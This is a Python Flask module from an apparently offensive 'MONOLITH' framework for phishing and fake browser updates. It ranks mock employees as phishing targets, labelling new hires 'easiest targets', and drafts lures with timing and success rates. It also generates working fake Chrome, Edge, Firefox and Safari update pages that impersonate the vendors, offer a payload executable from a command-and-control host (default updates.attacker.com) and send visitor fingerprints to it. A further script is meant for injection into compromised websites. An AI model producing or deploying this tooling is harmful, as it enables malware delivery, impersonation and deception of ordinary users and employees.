"""
Psychological & Social Engineering Ops - MONOLITH Framework
============================================================
"İnsanı hacklemek" - The human is always the weakest link.

Features:
- Automated LinkedIn Profiler & Relationship Mapper
- Fake Update Landing Page Generator (Chrome/Edge/Firefox)
- AI-powered target selection for phishing campaigns

Author: MONOLITH Team
Date: February 2025
"""

from flask import Blueprint, render_template, request, jsonify
import json
import hashlib
import random
import string
from datetime import datetime, timedelta
from typing import Dict, List, Optional
import base64
import re

social_eng_bp = Blueprint('social_eng', __name__, url_prefix='/social-eng')

# ============================================================================
# LINKEDIN PROFILER & RELATIONSHIP MAPPER
# ============================================================================

class LinkedInProfiler:
    """
    Automated LinkedIn scraping and relationship mapping.
    Identifies organizational hierarchy and weak targets.
    """
    
    # Job title hierarchy weights (higher = more access)
    TITLE_HIERARCHY = {
        'ceo': 100, 'cto': 95, 'cfo': 95, 'ciso': 95, 'coo': 95,
        'vp': 85, 'vice president': 85, 'director': 80,
        'senior manager': 75, 'manager': 70, 'team lead': 65,
        'senior': 60, 'specialist': 50, 'analyst': 45,
        'associate': 40, 'junior': 35, 'intern': 20, 'trainee': 15
    }
    
    # Departments and their value for lateral movement
    DEPARTMENT_VALUE = {
        'it': 95, 'information technology': 95, 'security': 90, 'infosec': 90,
        'devops': 85, 'engineering': 80, 'development': 80,
        'hr': 75, 'human resources': 75, 'finance': 70, 'accounting': 70,
        'executive': 100, 'c-suite': 100, 'operations': 65,
        'sales': 50, 'marketing': 45, 'support': 40, 'customer service': 35
    }
    
    # Vulnerability indicators
    VULNERABILITY_INDICATORS = {
        'new_hire': 90,           # Started within 90 days
        'recent_promotion': 70,   # Eager to please
        'job_seeker': 85,         # Open to new opportunities
        'active_poster': 60,      # Shares too much
        'many_connections': 40,   # Accepts anyone
        'incomplete_profile': 55  # Less security aware
    }
    
    def __init__(self):
        self.profiles = []
        self.relationships = []
        self.org_chart = {}
    
    def generate_mock_employees(self, company: str, count: int = 50) -> List[Dict]:
        """Generate realistic mock employee profiles for demo"""
        
        first_names = ['James', 'Sarah', 'Michael', 'Emily', 'David', 'Jessica', 
                      'Robert', 'Ashley', 'William', 'Amanda', 'John', 'Stephanie',
                      'Christopher', 'Nicole', 'Matthew', 'Jennifer', 'Daniel', 'Elizabeth',
                      'Andrew', 'Megan', 'Joshua', 'Lauren', 'Joseph', 'Rachel',
                      'Ahmet', 'Mehmet', 'Ayşe', 'Fatma', 'Ali', 'Zeynep']
        
        last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia',
                     'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez',
                     'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson',
                     'Yılmaz', 'Kaya', 'Demir', 'Şahin', 'Çelik', 'Öztürk']
        
        titles = [
            ('CEO', 'Executive', 1),
            ('CTO', 'Executive', 1),
            ('CISO', 'Security', 1),
            ('VP of Engineering', 'Engineering', 2),
            ('VP of Sales', 'Sales', 2),
            ('IT Director', 'IT', 2),
            ('HR Director', 'Human Resources', 1),
            ('Security Manager', 'Security', 3),
            ('DevOps Manager', 'IT', 3),
            ('Senior Developer', 'Engineering', 8),
            ('Software Engineer', 'Engineering', 10),
            ('IT Support Specialist', 'IT', 5),
            ('HR Specialist', 'Human Resources', 3),
            ('Security Analyst', 'Security', 4),
            ('Junior Developer', 'Engineering', 5),
            ('Intern', 'Engineering', 3),
            ('Sales Representative', 'Sales', 5),
            ('Marketing Specialist', 'Marketing', 4)
        ]
        
        employees = []
        title_counts = {}
        
        for i in range(count):
            # Select title based on distribution
            available_titles = [(t, d, c) for t, d, c in titles if title_counts.get(t, 0) < c]
            if not available_titles:
                available_titles = titles[-5:]  # Use common titles
            
            title, department, _ = random.choice(available_titles)
            title_counts[title] = title_counts.get(title, 0) + 1
            
            first = random.choice(first_names)
            last = random.choice(last_names)
            
            # Determine hire date (some are new hires)
            if random.random() < 0.15:  # 15% are new hires
                hire_date = datetime.now() - timedelta(days=random.randint(1, 60))
                is_new_hire = True
            else:
                hire_date = datetime.now() - timedelta(days=random.randint(180, 2000))
                is_new_hire = False
            
            # Calculate vulnerability score
            vuln_score = 0
            vuln_factors = []
            
            if is_new_hire:
                vuln_score += self.VULNERABILITY_INDICATORS['new_hire']
                vuln_factors.append('New Hire (< 90 days)')
            
            if random.random() < 0.1:
                vuln_score += self.VULNERABILITY_INDICATORS['job_seeker']
                vuln_factors.append('Open to Opportunities')
            
            if random.random() < 0.2:
                vuln_score += self.VULNERABILITY_INDICATORS['active_poster']
                vuln_factors.append('Active Social Media')
            
            if random.random() < 0.15:
                vuln_score += self.VULNERABILITY_INDICATORS['incomplete_profile']
                vuln_factors.append('Incomplete Profile')
            
            # Department value
            dept_value = self.DEPARTMENT_VALUE.get(department.lower(), 30)
            
            # Title hierarchy
            title_value = 30
            for key, value in self.TITLE_HIERARCHY.items():
                if key in title.lower():
                    title_value = value
                    break
            
            # Calculate overall target score
            target_score = int((vuln_score * 0.4) + (dept_value * 0.3) + (title_value * 0.3))
            
            employee = {
                'id': f'emp_{i+1:04d}',
                'name': f'{first} {last}',
                'email': f'{first.lower()}.{last.lower()}@{company.lower().replace(" ", "")}.com',
                'title': title,
                'department': department,
                'linkedin_url': f'https://linkedin.com/in/{first.lower()}-{last.lower()}-{random.randint(1000,9999)}',
                'hire_date': hire_date.strftime('%Y-%m-%d'),
                'is_new_hire': is_new_hire,
                'connections': random.randint(50, 2500),
                'vulnerability_score': min(vuln_score, 100),
                'vulnerability_factors': vuln_factors,
                'department_value': dept_value,
                'title_value': title_value,
                'target_score': min(target_score, 100),
                'profile_completeness': random.randint(40, 100),
                'last_active': (datetime.now() - timedelta(days=random.randint(0, 30))).strftime('%Y-%m-%d'),
                'manager_id': None  # Will be set in relationship mapping
            }
            
            employees.append(employee)
        
        self.profiles = employees
        self._build_relationships()
        return employees
    
    def _build_relationships(self):
        """Build organizational hierarchy from profiles"""
        
        # Sort by title value (highest first)
        sorted_profiles = sorted(self.profiles, key=lambda x: x['title_value'], reverse=True)
        
        # Group by department
        departments = {}
        for emp in sorted_profiles:
            dept = emp['department']
            if dept not in departments:
                departments[dept] = []
            departments[dept].append(emp)
        
        # Build hierarchy within departments
        for dept, members in departments.items():
            if len(members) > 1:
                # First person is the manager
                manager = members[0]
                for subordinate in members[1:]:
                    subordinate['manager_id'] = manager['id']
                    self.relationships.append({
                        'manager': manager['id'],
                        'subordinate': subordinate['id'],
                        'department': dept
                    })
        
        self.org_chart = departments
    
    def get_top_targets(self, count: int = 10) -> List[Dict]:
        """Get highest value targets for phishing"""
        sorted_profiles = sorted(self.profiles, key=lambda x: x['target_score'], reverse=True)
        return sorted_profiles[:count]
    
    def get_new_hires(self) -> List[Dict]:
        """Get all new hires - easiest targets"""
        return [p for p in self.profiles if p['is_new_hire']]
    
    def get_department_heads(self) -> List[Dict]:
        """Get department heads/managers"""
        return [p for p in self.profiles if p['title_value'] >= 70]
    
    def generate_phishing_recommendations(self) -> Dict:
        """AI-powered phishing target recommendations"""
        
        new_hires = self.get_new_hires()
        top_targets = self.get_top_targets(5)
        dept_heads = self.get_department_heads()
        
        recommendations = {
            'primary_targets': [],
            'secondary_targets': [],
            'campaign_suggestions': []
        }
        
        # Primary: New hires with high department value
        for hire in new_hires:
            if hire['department_value'] >= 70:
                recommendations['primary_targets'].append({
                    'employee': hire,
                    'attack_vector': 'Welcome Package Email',
                    'pretext': f"Welcome to the team! Please complete your onboarding by installing our security software.",
                    'urgency': 'HIGH',
                    'success_probability': 85
                })
        
        # Secondary: IT/Security staff
        for target in top_targets:
            if target not in [r['employee'] for r in recommendations['primary_targets']]:
                recommendations['secondary_targets'].append({
                    'employee': target,
                    'attack_vector': 'Urgent Security Update',
                    'pretext': f"Critical vulnerability detected. Immediate patch required for {target['department']} systems.",
                    'urgency': 'MEDIUM',
                    'success_probability': 65
                })
        
        # Campaign suggestions
        recommendations['campaign_suggestions'] = [
            {
                'name': 'New Hire Welcome Campaign',
                'targets': len(new_hires),
                'template': 'IT Onboarding Package',
                'timing': 'First week of employment',
                'expected_success': '70-85%'
            },
            {
                'name': 'Fake Browser Update',
                'targets': len(self.profiles),
                'template': 'Chrome/Edge Update Required',
                'timing': 'Tuesday-Thursday 10AM-2PM',
                'expected_success': '15-25%'
            },
            {
                'name': 'Executive Spear Phishing',
                'targets': len(dept_heads),
                'template': 'Board Meeting Documents',
                'timing': 'Monday morning',
                'expected_success': '20-35%'
            }
        ]
        
        return recommendations

# ============================================================================
# FAKE UPDATE LANDING PAGE GENERATOR
# ============================================================================

class FakeUpdateGenerator:
    """
    Generates convincing browser update pages that deliver payloads.
    Detects browser type and shows matching fake update page.
    """
    
    # Browser detection and templates
    BROWSER_TEMPLATES = {
        'chrome': {
            'name': 'Google Chrome',
            'icon': '🔵',
            'color': '#4285F4',
            'gradient': 'linear-gradient(135deg, #4285F4 0%, #34A853 100%)',
            'logo_url': 'https://www.google.com/chrome/static/images/chrome-logo.svg',
            'update_title': 'Chrome Update Required',
            'version_pattern': 'Chrome/{version}',
            'fake_version': '122.0.6261.112',
            'payload_name': 'ChromeUpdate.exe'
        },
        'edge': {
            'name': 'Microsoft Edge',
            'icon': '🔷',
            'color': '#0078D4',
            'gradient': 'linear-gradient(135deg, #0078D4 0%, #00BCF2 100%)',
            'logo_url': 'https://edgestatic.azureedge.net/shared/cms/lrs1c69a1j/logos/edge-logo.png',
            'update_title': 'Microsoft Edge Security Update',
            'version_pattern': 'Edg/{version}',
            'fake_version': '122.0.2365.66',
            'payload_name': 'EdgeUpdate.exe'
        },
        'firefox': {
            'name': 'Mozilla Firefox',
            'icon': '🦊',
            'color': '#FF7139',
            'gradient': 'linear-gradient(135deg, #FF7139 0%, #E66000 100%)',
            'logo_url': 'https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.svg',
            'update_title': 'Firefox Security Update',
            'version_pattern': 'Firefox/{version}',
            'fake_version': '123.0.1',
            'payload_name': 'FirefoxUpdate.exe'
        },
        'safari': {
            'name': 'Apple Safari',
            'icon': '🧭',
            'color': '#006CFF',
            'gradient': 'linear-gradient(135deg, #006CFF 0%, #5AC8FA 100%)',
            'logo_url': 'https://www.apple.com/v/safari/m/images/overview/safari_icon__cffk3jdx5yuy_large.png',
            'update_title': 'Safari Security Update',
            'version_pattern': 'Safari/{version}',
            'fake_version': '17.3.1',
            'payload_name': 'SafariUpdate.pkg'
        }
    }
    
    # Urgency messages
    URGENCY_MESSAGES = {
        'critical': [
            "⚠️ CRITICAL SECURITY VULNERABILITY DETECTED",
            "🔴 Your browser is severely out of date",
            "⛔ Immediate update required to protect your data"
        ],
        'high': [
            "⚠️ Important Security Update Available",
            "Your browser version has known vulnerabilities",
            "Update now to stay protected"
        ],
        'medium': [
            "New version available",
            "Update your browser for better performance",
            "Security improvements included"
        ]
    }
    
    def __init__(self):
        self.generated_pages = []
    
    def generate_landing_page(self, 
                             browser: str = 'chrome',
                             urgency: str = 'critical',
                             c2_url: str = 'https://updates.attacker.com',
                             custom_payload_name: str = None) -> Dict:
        """Generate a fake browser update landing page"""
        
        template = self.BROWSER_TEMPLATES.get(browser, self.BROWSER_TEMPLATES['chrome'])
        messages = self.URGENCY_MESSAGES.get(urgency, self.URGENCY_MESSAGES['high'])
        
        payload_name = custom_payload_name or template['payload_name']
        page_id = hashlib.md5(f"{browser}{datetime.now().isoformat()}".encode()).hexdigest()[:12]
        
        # Generate the HTML page
        html_content = self._generate_html(template, messages, c2_url, payload_name, urgency)
        
        # Generate JavaScript for browser detection and fingerprinting
        js_content = self._generate_js(template, c2_url, payload_name)
        
        page_data = {
            'page_id': page_id,
            'browser': browser,
            'urgency': urgency,
            'payload_url': f"{c2_url}/download/{payload_name}",
            'html': html_content,
            'javascript': js_content,
            'created_at': datetime.now().isoformat(),
            'template': template,
            'tracking_pixel': f"{c2_url}/track/{page_id}.gif"
        }
        
        self.generated_pages.append(page_data)
        return page_data
    
    def _generate_html(self, template: Dict, messages: List[str], 
                       c2_url: str, payload_name: str, urgency: str) -> str:
        """Generate the fake update HTML page"""
        
        urgency_color = '#dc3545' if urgency == 'critical' else '#ffc107' if urgency == 'high' else '#17a2b8'
        
        html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{template['update_title']}</title>
    <link rel="icon" href="{template['logo_url']}" type="image/png">
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
        }}
        
        body {{
            min-height: 100vh;
            background: {template['gradient']};
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }}
        
        .update-container {{
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 500px;
            width: 100%;
            overflow: hidden;
        }}
        
        .header {{
            background: {template['color']};
            padding: 30px;
            text-align: center;
            color: white;
        }}
        
        .logo {{
            width: 80px;
            height: 80px;
            margin-bottom: 15px;
        }}
        
        .browser-name {{
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 5px;
        }}
        
        .content {{
            padding: 30px;
            text-align: center;
        }}
        
        .warning-badge {{
            display: inline-block;
            background: {urgency_color};
            color: white;
            padding: 8px 20px;
            border-radius: 20px;
            font-weight: 600;
            font-size: 12px;
            text-transform: uppercase;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }}
        
        @keyframes pulse {{
            0%, 100% {{ opacity: 1; }}
            50% {{ opacity: 0.7; }}
        }}
        
        .message {{
            font-size: 18px;
            color: #333;
            margin-bottom: 10px;
            font-weight: 500;
        }}
        
        .submessage {{
            font-size: 14px;
            color: #666;
            margin-bottom: 25px;
            line-height: 1.6;
        }}
        
        .version-info {{
            background: #f8f9fa;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 25px;
        }}
        
        .version-row {{
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #e9ecef;
        }}
        
        .version-row:last-child {{
            border-bottom: none;
        }}
        
        .version-label {{
            color: #666;
            font-size: 13px;
        }}
        
        .version-value {{
            font-weight: 600;
            font-size: 13px;
        }}
        
        .version-old {{
            color: #dc3545;
        }}
        
        .version-new {{
            color: #28a745;
        }}
        
        .update-btn {{
            display: block;
            width: 100%;
            padding: 16px;
            background: {template['color']};
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            text-decoration: none;
        }}
        
        .update-btn:hover {{
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
        }}
        
        .update-btn i {{
            margin-right: 8px;
        }}
        
        .footer {{
            padding: 20px 30px;
            background: #f8f9fa;
            text-align: center;
            font-size: 11px;
            color: #999;
        }}
        
        .security-badges {{
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 15px;
        }}
        
        .badge {{
            display: flex;
            align-items: center;
            gap: 5px;
            font-size: 11px;
            color: #666;
        }}
        
        .progress-container {{
            display: none;
            margin-top: 20px;
        }}
        
        .progress-bar {{
            height: 6px;
            background: #e9ecef;
            border-radius: 3px;
            overflow: hidden;
        }}
        
        .progress-fill {{
            height: 100%;
            background: {template['color']};
            width: 0%;
            transition: width 0.3s;
        }}
        
        .progress-text {{
            margin-top: 10px;
            font-size: 13px;
            color: #666;
        }}
    </style>
</head>
<body>
    <div class="update-container">
        <div class="header">
            <img src="{template['logo_url']}" alt="{template['name']}" class="logo" onerror="this.style.display='none'">
            <div class="browser-name">{template['name']}</div>
            <div style="font-size: 13px; opacity: 0.9;">Security Update Center</div>
        </div>
        
        <div class="content">
            <div class="warning-badge">{messages[0]}</div>
            
            <div class="message">{messages[1]}</div>
            <div class="submessage">
                {messages[2]}<br>
                Your current version contains <strong>critical security vulnerabilities</strong> 
                that could expose your personal data and browsing activity.
            </div>
            
            <div class="version-info">
                <div class="version-row">
                    <span class="version-label">Your Version:</span>
                    <span class="version-value version-old" id="current-version">Detecting...</span>
                </div>
                <div class="version-row">
                    <span class="version-label">Latest Version:</span>
                    <span class="version-value version-new">{template['fake_version']}</span>
                </div>
                <div class="version-row">
                    <span class="version-label">Security Status:</span>
                    <span class="version-value version-old">⚠️ Vulnerable</span>
                </div>
            </div>
            
            <a href="{c2_url}/download/{payload_name}" class="update-btn" id="download-btn" onclick="startDownload()">
                ⬇️ Download Update Now
            </a>
            
            <div class="progress-container" id="progress">
                <div class="progress-bar">
                    <div class="progress-fill" id="progress-fill"></div>
                </div>
                <div class="progress-text" id="progress-text">Preparing download...</div>
            </div>
        </div>
        
        <div class="footer">
            <div>This update is provided by {template['name']} Security Team</div>
            <div class="security-badges">
                <span class="badge">🔒 Verified Publisher</span>
                <span class="badge">✓ Digitally Signed</span>
                <span class="badge">🛡️ Safe Download</span>
            </div>
        </div>
    </div>
    
    <!-- Tracking pixel -->
    <img src="{c2_url}/track/visit.gif" style="display:none" width="1" height="1">
    
    <script>
        // Browser version detection
        function detectBrowserVersion() {{
            const ua = navigator.userAgent;
            let version = "Unknown";
            
            if (ua.includes("Chrome/")) {{
                version = ua.match(/Chrome\\/(\\d+\\.\\d+\\.\\d+\\.\\d+)/)?.[1] || "Unknown";
            }} else if (ua.includes("Edg/")) {{
                version = ua.match(/Edg\\/(\\d+\\.\\d+\\.\\d+\\.\\d+)/)?.[1] || "Unknown";
            }} else if (ua.includes("Firefox/")) {{
                version = ua.match(/Firefox\\/(\\d+\\.\\d+)/)?.[1] || "Unknown";
            }} else if (ua.includes("Safari/")) {{
                version = ua.match(/Version\\/(\\d+\\.\\d+)/)?.[1] || "Unknown";
            }}
            
            document.getElementById("current-version").textContent = version + " ⚠️";
        }}
        
        // Fingerprint collection
        function collectFingerprint() {{
            const fp = {{
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenRes: screen.width + "x" + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                timestamp: new Date().toISOString()
            }};
            
            // Send to C2
            fetch("{c2_url}/fingerprint", {{
                method: "POST",
                headers: {{"Content-Type": "application/json"}},
                body: JSON.stringify(fp)
            }}).catch(() => {{}});
        }}
        
        // Fake download progress
        function startDownload() {{
            document.getElementById("progress").style.display = "block";
            document.getElementById("download-btn").style.display = "none";
            
            let progress = 0;
            const interval = setInterval(() => {{
                progress += Math.random() * 15;
                if (progress >= 100) {{
                    progress = 100;
                    clearInterval(interval);
                    document.getElementById("progress-text").textContent = "Download complete! Please run the installer.";
                }}
                document.getElementById("progress-fill").style.width = progress + "%";
                document.getElementById("progress-text").textContent = "Downloading... " + Math.floor(progress) + "%";
            }}, 200);
        }}
        
        // Initialize
        detectBrowserVersion();
        collectFingerprint();
    </script>
</body>
</html>'''
        
        return html
    
    def _generate_js(self, template: Dict, c2_url: str, payload_name: str) -> str:
        """Generate browser detection JavaScript"""
        
        js = f'''
// Browser Detection and Auto-Redirect Script
// Embed this in compromised websites

(function() {{
    const browsers = {{
        chrome: /Chrome\\/([\\d.]+)/,
        edge: /Edg\\/([\\d.]+)/,
        firefox: /Firefox\\/([\\d.]+)/,
        safari: /Safari\\/([\\d.]+)/
    }};
    
    function detectBrowser() {{
        const ua = navigator.userAgent;
        for (const [name, pattern] of Object.entries(browsers)) {{
            if (pattern.test(ua)) {{
                return {{ name, version: ua.match(pattern)[1] }};
            }}
        }}
        return {{ name: 'chrome', version: 'unknown' }};
    }}
    
    function shouldShowUpdate() {{
        // Show to 30% of visitors (configurable)
        return Math.random() < 0.30;
    }}
    
    function showFakeUpdate() {{
        const browser = detectBrowser();
        const updateUrl = "{c2_url}/update/" + browser.name;
        
        // Option 1: Redirect
        // window.location.href = updateUrl;
        
        // Option 2: Popup/overlay
        const iframe = document.createElement('iframe');
        iframe.src = updateUrl;
        iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:999999;';
        document.body.appendChild(iframe);
    }}
    
    // Trigger on page load or after delay
    if (shouldShowUpdate()) {{
        setTimeout(showFakeUpdate, 3000);
    }}
}})();
'''
        return js
    
    def generate_detection_script(self, c2_url: str) -> str:
        """Generate script that detects browser and redirects to appropriate fake update page"""
        
        script = f'''<script>
(function() {{
    var ua = navigator.userAgent;
    var browser = 'chrome';
    
    if (ua.indexOf('Edg/') > -1) browser = 'edge';
    else if (ua.indexOf('Firefox/') > -1) browser = 'firefox';
    else if (ua.indexOf('Safari/') > -1 && ua.indexOf('Chrome/') === -1) browser = 'safari';
    
    // Redirect to browser-specific update page
    window.location.href = '{c2_url}/update/' + browser + '?ref=' + encodeURIComponent(document.referrer);
}})();
</script>'''
        
        return script
    
    def get_all_templates(self) -> Dict:
        """Return all browser templates"""
        return self.BROWSER_TEMPLATES


# ============================================================================
# FLASK ROUTES
# ============================================================================

# Initialize instances
linkedin_profiler = LinkedInProfiler()
fake_update_gen = FakeUpdateGenerator()

@social_eng_bp.route('/')
def social_eng_dashboard():
    """Social Engineering Operations Dashboard"""
    return render_template('social_engineering_ops.html')

# LinkedIn Profiler Routes
@social_eng_bp.route('/api/scan-company', methods=['POST'])
def scan_company():
    """Scan a company and generate employee profiles"""
    data = request.get_json()
    company = data.get('company', 'Target Corp')
    employee_count = data.get('count', 50)
    
    employees = linkedin_profiler.generate_mock_employees(company, employee_count)
    
    return jsonify({
        'success': True,
        'company': company,
        'total_employees': len(employees),
        'employees': employees[:20],  # Return first 20 for preview
        'new_hires': len(linkedin_profiler.get_new_hires()),
        'department_heads': len(linkedin_profiler.get_department_heads())
    })

@social_eng_bp.route('/api/get-targets', methods=['GET'])
def get_targets():
    """Get top phishing targets"""
    count = request.args.get('count', 10, type=int)
    targets = linkedin_profiler.get_top_targets(count)
    
    return jsonify({
        'success': True,
        'targets': targets
    })

@social_eng_bp.route('/api/get-new-hires', methods=['GET'])
def get_new_hires():
    """Get all new hires"""
    new_hires = linkedin_profiler.get_new_hires()
    
    return jsonify({
        'success': True,
        'new_hires': new_hires,
        'count': len(new_hires)
    })

@social_eng_bp.route('/api/get-org-chart', methods=['GET'])
def get_org_chart():
    """Get organizational chart"""
    return jsonify({
        'success': True,
        'org_chart': linkedin_profiler.org_chart,
        'relationships': linkedin_profiler.relationships
    })

@social_eng_bp.route('/api/phishing-recommendations', methods=['GET'])
def phishing_recommendations():
    """Get AI-powered phishing recommendations"""
    recommendations = linkedin_profiler.generate_phishing_recommendations()
    
    return jsonify({
        'success': True,
        'recommendations': recommendations
    })

# Fake Update Routes
@social_eng_bp.route('/api/browser-templates', methods=['GET'])
def browser_templates():
    """Get all browser templates"""
    return jsonify({
        'success': True,
        'templates': fake_update_gen.get_all_templates()
    })

@social_eng_bp.route('/api/generate-update-page', methods=['POST'])
def generate_update_page():
    """Generate a fake browser update page"""
    data = request.get_json()
    
    browser = data.get('browser', 'chrome')
    urgency = data.get('urgency', 'critical')
    c2_url = data.get('c2_url', 'https://updates.attacker.com')
    payload_name = data.get('payload_name')
    
    page = fake_update_gen.generate_landing_page(
        browser=browser,
        urgency=urgency,
        c2_url=c2_url,
        custom_payload_name=payload_name
    )
    
    return jsonify({
        'success': True,
        'page': page
    })

@social_eng_bp.route('/api/generate-detection-script', methods=['POST'])
def generate_detection_script():
    """Generate browser detection script"""
    data = request.get_json()
    c2_url = data.get('c2_url', 'https://updates.attacker.com')
    
    script = fake_update_gen.generate_detection_script(c2_url)
    
    return jsonify({
        'success': True,
        'script': script
    })

@social_eng_bp.route('/api/urgency-messages', methods=['GET'])
def urgency_messages():
    """Get urgency message templates"""
    return jsonify({
        'success': True,
        'messages': fake_update_gen.URGENCY_MESSAGES
    })
